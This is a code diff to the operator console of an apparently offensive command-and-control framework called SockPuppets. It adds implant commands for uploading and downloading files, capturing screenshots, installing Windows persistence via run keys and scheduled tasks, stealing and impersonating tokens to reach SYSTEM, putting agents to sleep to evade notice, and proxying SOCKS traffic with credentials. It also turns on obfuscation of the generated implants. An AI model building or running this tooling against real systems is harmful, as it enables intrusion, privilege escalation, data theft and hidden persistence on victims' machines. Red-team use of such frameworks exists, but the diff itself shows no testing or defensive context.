@@ -405,9 +405,13 @@ class SockPuppetsCLI(cmd.Cmd):
         print("[*] Type 'back' or 'exit' to return to main menu")
         print("[*] Type 'kill' to terminate the agent")
         print("[*] Type 'results' to view pending results")
-        if not self.server.agents.get(agent_id, None) or not self.server.agents[agent_id].is_http():
-            print("[*] Type 'socks <port>' to start SOCKS proxy")
+        print("[*] Type 'socks <port> [user pass]' to start SOCKS proxy")
         print("[*] Type 'sleep <seconds>' to set beacon interval")
+        print("[*] Type 'dormant <hours>' to put agent into dormancy")
+        print("[*] Type 'upload <local_path> <remote_path>' to upload a file")
+        print("[*] Type 'download <remote_path>' to download a file")
+        print("[*] Type 'persist <method>' to install persistence (run/schtask)")
+        print("[*] Type 'screenshot' to capture a screenshot")
         print("[*] Type 'upgrade' to switch to streaming mode")
         print("[*] Type 'downgrade [seconds]' to switch to beacon mode")
         if self.server.agents.get(agent_id) and self.server.agents[agent_id].is_http():
@@ -550,20 +554,73 @@ class SockPuppetsCLI(cmd.Cmd):
                                 pass
                         continue
 
+                    if command.lower().startswith('upload '):
+                        parts = command.split(None, 2)
+                        if len(parts) != 3:
+                            print("[-] Usage: upload <local_path> <remote_path>")
+                            continue
+                        local_path = parts[1]
+                        remote_path = parts[2]
+                        try:
+                            import base64 as b64mod
+                            with open(local_path, 'rb') as f:
+                                data = f.read()
+                            if len(data) > 1024 * 1024:
+                                print("[-] File too large (max 1MB)")
+                                continue
+                            encoded = b64mod.b64encode(data).decode()
+                            upload_cmd = f"__px:upload:{remote_path}:{encoded}"
+                            future = asyncio.run_coroutine_threadsafe(
+                                self.server.send_command_to_agent(agent_id, upload_cmd),
+                                self.loop
+                            )
+                            current_agent = self.server.agents.get(agent_id)
+                            if current_agent and current_agent.mode == 'streaming':
+                                result = future.result(timeout=65)
+                            else:
+                                result = future.result(timeout=15)
+                            print(f"[+] {result}")
+                        except FileNotFoundError:
+                            print(f"[-] Local file not found: {local_path}")
+                        except Exception as e:
+                            print(f"[-] Error: {str(e)}")
+                        continue
+
+                    # Convenience aliases for postex commands
+                    postex_aliases = {
+                        'screenshot': '__px:screenshot',
+                        'getsystem': '__px:token:getsystem',
+                        'rev2self': '__px:token:rev2self',
+                    }
+                    cmd_lower = command.lower().strip()
+                    if cmd_lower in postex_aliases:
+                        command = postex_aliases[cmd_lower]
+                    elif cmd_lower.startswith('steal_token '):
+                        pid = command.split(None, 1)[1]
+                        command = f"__px:token:steal_token {pid}"
+                    elif cmd_lower.startswith('make_token '):
+                        args = command.split(None, 1)[1]
+                        command = f"__px:token:make_token {args}"
+                    elif cmd_lower.startswith('download '):
+                        path = command.split(None, 1)[1]
+                        command = f"__px:download:{path}"
+
                     if command.lower().startswith('socks'):
                         parts = command.split()
-                        if len(parts) != 2:
-                            print("[-] Usage: socks <port>")
+                        if len(parts) < 2 or len(parts) > 4:
+                            print("[-] Usage: socks <port> [user pass]")
                             continue
 
                         try:
                             socks_port = int(parts[1])
+                            socks_user = parts[2] if len(parts) > 2 else None
+                            socks_pass = parts[3] if len(parts) > 3 else None
                             if not self.loop:
                                 print("[-] Event loop not available")
                                 continue
 
                             future = asyncio.run_coroutine_threadsafe(
-                                self.server.start_socks_proxy(agent_id, socks_port),
+                                self.server.start_socks_proxy(agent_id, socks_port, socks_user, socks_pass),
                                 self.loop
                             )
                             result = future.result(timeout=5)
@@ -665,6 +722,77 @@ class SockPuppetsCLI(cmd.Cmd):
                             )
                             result = future.result(timeout=5)
                             print(f"[+] {result}")
+                        except Exception as e:
+                            print(f"[-] Error: {str(e)}")
+                        continue
+
+                    if command.lower().startswith('download '):
+                        parts = command.split(None, 1)
+                        if len(parts) != 2:
+                            print("[-] Usage: download <remote_path>")
+                            continue
+                        remote_path = parts[1]
+                        px_cmd = f"__px:download:{remote_path}"
+                        try:
+                            future = asyncio.run_coroutine_threadsafe(
+                                self.server.send_command_to_agent(agent_id, px_cmd),
+                                self.loop
+                            )
+                            result = future.result(timeout=15)
+                            print(f"[*] Download queued — result arrives on next beacon")
+                        except Exception as e:
+                            print(f"[-] Download error: {str(e)}")
+                        continue
+
+                    if command.lower().startswith('dormant '):
+                        parts = command.split()
+                        if len(parts) != 2:
+                            print("[-] Usage: dormant <hours>")
+                            continue
+                        try:
+                            hours = float(parts[1])
+                            if hours <= 0:
+                                print("[-] Hours must be positive")
+                                continue
+                            dormant_cmd = f"__dormant:{hours}"
+                            future = asyncio.run_coroutine_threadsafe(
+                                self.server.send_command_to_agent(agent_id, dormant_cmd),
+                                self.loop
+                            )
+                            result = future.result(timeout=15)
+                            print(f"[+] Agent entering dormancy for {hours}h — it will resume automatically")
+                        except ValueError:
+                            print("[-] Invalid hours value")
+                        except Exception as e:
+                            print(f"[-] Error: {str(e)}")
+                        continue
+
+                    if command.lower().startswith('persist'):
+                        parts = command.split(None, 1)
+                        args = parts[1] if len(parts) > 1 else ''
+                        if args and args not in ('run', 'reg', 'registry', 'schtask', 'task', 'remove', 'clean'):
+                            print("[-] Usage: persist [run|schtask|remove]")
+                            continue
+                        persist_cmd = f"persist {args}".strip()
+                        try:
+                            future = asyncio.run_coroutine_threadsafe(
+                                self.server.send_command_to_agent(agent_id, persist_cmd),
+                                self.loop
+                            )
+                            result = future.result(timeout=15)
+                            print(f"[+] {result}")
+                        except Exception as e:
+                            print(f"[-] Error: {str(e)}")
+                        continue
+
+                    if command.lower() == 'screenshot':
+                        try:
+                            future = asyncio.run_coroutine_threadsafe(
+                                self.server.send_command_to_agent(agent_id, "__px:screenshot"),
+                                self.loop
+                            )
+                            result = future.result(timeout=15)
+                            print(f"[+] Screenshot queued — result arrives on next beacon")
                         except Exception as e:
                             print(f"[-] Error: {str(e)}")
                         continue
@@ -1125,7 +1253,7 @@ class SockPuppetsCLI(cmd.Cmd):
                     host, port, encryption_key=key, transport=transport,
                     beacon_interval=beacon_interval, beacon_jitter=beacon_jitter,
                     target_os=target_os if target_os != 'auto' else 'windows',
-                    target_arch=arch, garble=False,
+                    target_arch=arch, garble=True,
                     output_format=go_fmt,
                     env_hostname=env_hostname, env_domain=env_domain,
                     env_mac=env_mac, env_registry=env_registry,
@@ -1542,6 +1670,16 @@ class SockPuppetsCLI(cmd.Cmd):
         print("  \033[1mresults\033[0m               View pending beacon results")
         print("  \033[1msocks <port>\033[0m          Start SOCKS5 proxy on port")
         print("  \033[1msleep <seconds>\033[0m       Set beacon interval")
+        print("  \033[1mupload <local> <remote>\033[0m Upload file to agent")
+        print("  \033[1mdownload <remote_path>\033[0m Download file from agent")
+        print("  \033[1mscreenshot\033[0m            Capture screenshot (Windows)")
+        print("  \033[1mpersist [reg|schtask]\033[0m  Install persistence (Windows)")
+        print("  \033[1mpersist remove\033[0m        Remove all persistence")
+        print("  \033[1mdormant <duration>\033[0m    Go dormant (e.g. 1h, 30m)")
+        print("  \033[1mgetsystem\033[0m             Steal SYSTEM token (Windows)")
+        print("  \033[1msteal_token <PID>\033[0m     Impersonate process token")
+        print("  \033[1mmake_token D\\U PASS\033[0m   Create token with creds")
+        print("  \033[1mrev2self\033[0m              Revert to original token")
         print("  \033[1mupgrade\033[0m               Upgrade to streaming mode")
         print("  \033[1mupgrade_ws\033[0m            Upgrade HTTP agent to WebSocket")
         print("  \033[1mdowngrade [seconds]\033[0m   Downgrade to beacon mode")
